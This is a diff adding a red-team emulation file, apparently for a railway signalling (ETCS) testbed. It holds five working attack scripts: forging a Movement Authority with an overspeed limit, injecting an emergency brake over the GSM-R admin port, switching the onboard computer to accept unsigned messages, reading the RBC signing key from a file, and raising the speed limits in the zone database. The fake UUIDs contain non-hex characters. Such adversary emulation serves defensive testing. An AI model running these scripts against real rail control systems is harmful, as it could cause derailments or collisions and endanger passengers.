@@ -1,0 +1,222 @@
+---
+id: 1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
+name: ETCS Overspeed Attack (JSON)
+description: Inject forged Movement Authority with dangerously high speed limit via GSM-R admin interface
+tactic: impact
+technique:
+  attack_id: T0831
+  name: Manipulation of Control
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import json
+        import time
+
+        payload = {
+            "type": "MA",
+            "ma_id": int(time.time() * 1000) % 65536,
+            "position_km": 1.0,
+            "next_checkpoint_km": 10.0,
+            "speed_limit": #{etcs.speed_limit},
+            "message": "ATTACK_MA"
+        }
+        
+        message = {
+            "payload": payload,
+            "signature": "00deadbeef"  # Invalid signature
+        }
+        
+        line = json.dumps(message) + "\n"
+        
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("#{etcs.gsmr_host}", #{etcs.gsmr_admin_port}))
+            s.sendall(line.encode())
+            s.close()
+            print(f"[SUCCESS] Injected overspeed MA: {payload['speed_limit']} km/h")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.attack_result
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_reachable:
+      - source: etcs.gsmr_host
+      - source: etcs.gsmr_admin_port
+access:
+  - red
+---
+id: 2b3c4d5e-6f7g-8h9i-0j1k-2l3m4n5o6p7q
+name: ETCS Emergency Brake Attack (JSON)
+description: Inject emergency brake command to forcibly stop train
+tactic: impact
+technique:
+  attack_id: T0813
+  name: Denial of Control
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import json
+        import time
+
+        payload = {
+            "type": "EMERGENCY_UPDATE",
+            "ma_id": int(time.time() * 1000) % 65536,
+            "position_km": 1.0,
+            "next_checkpoint_km": 1.1,
+            "speed_limit": 0.0,
+            "message": "EMERGENCY_BRAKE_ATTACK"
+        }
+        
+        message = {
+            "payload": payload,
+            "signature": "00deadbeef"
+        }
+        
+        line = json.dumps(message) + "\n"
+        
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("#{etcs.gsmr_host}", #{etcs.gsmr_admin_port}))
+            s.sendall(line.encode())
+            s.close()
+            print("[SUCCESS] Injected emergency brake command")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.attack_result
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_reachable:
+      - source: etcs.gsmr_host
+      - source: etcs.gsmr_admin_port
+access:
+  - red
+---
+id: 3c4d5e6f-7g8h-9i0j-1k2l-3m4n5o6p7q8r
+name: ETCS Signature Bypass Enable
+description: Enable unsigned message acceptance mode in EVC for follow-on attacks
+tactic: defense-evasion
+technique:
+  attack_id: T0858
+  name: Change Operating Mode
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+
+        cmd = "UNSIGNED ON\n"
+        
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("#{etcs.evc_host}", #{etcs.evc_driver_port}))
+            s.sendall(cmd.encode())
+            response = s.recv(1024).decode()
+            s.close()
+            print(f"[SUCCESS] Enabled unsigned mode: {response.strip()}")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.unsigned_mode
+      cleanup:
+        - python3 << 'EOF'
+          import socket
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.connect(("#{etcs.evc_host}", #{etcs.evc_driver_port}))
+          s.sendall(b"UNSIGNED OFF\n")
+          s.close()
+          EOF
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_evc_reachable:
+      - source: etcs.evc_host
+      - source: etcs.evc_driver_port
+access:
+  - red
+---
+id: 4d5e6f7g-8h9i-0j1k-2l3m-4n5o6p7q8r9s
+name: ETCS RBC Key Theft
+description: Steal RBC signing key from insecure storage
+tactic: credential-access
+technique:
+  attack_id: T1552.001
+  name: Credentials in Files
+platforms:
+  linux:
+    sh:
+      command: |
+        if [ -f "#{etcs.rbc_key_path}" ]; then
+          cat "#{etcs.rbc_key_path}"
+          echo "[SUCCESS] Retrieved RBC key"
+        else
+          echo "[FAILED] Key file not found"
+        fi
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_key:
+          - source: etcs.rbc_key
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_rbc_access:
+      - source: etcs.rbc_key_path
+access:
+  - red
+---
+id: 5e6f7g8h-9i0j-1k2l-3m4n-5o6p7q8r9s0t
+name: ETCS Database Manipulation
+description: Modify RBC zone database to change speed limits
+tactic: impact
+technique:
+  attack_id: T0836
+  name: Modify Parameter
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import json
+
+        db_path = "#{etcs.rbc_db_path}"
+        
+        try:
+            with open(db_path, 'r') as f:
+                db = json.load(f)
+            
+            # Increase all speed limits by 100 km/h
+            for zone in db.get('zones', []):
+                zone['speed_limit'] += #{etcs.speed_increase}
+            
+            with open(db_path + '.malicious', 'w') as f:
+                json.dump(db, f, indent=2)
+            
+            print(f"[SUCCESS] Created modified database with increased speed limits")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.db_modified
+      cleanup:
+        - rm -f "#{etcs.rbc_db_path}.malicious"
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_rbc_access:
+      - source: etcs.rbc_db_path
+access:
+  - red
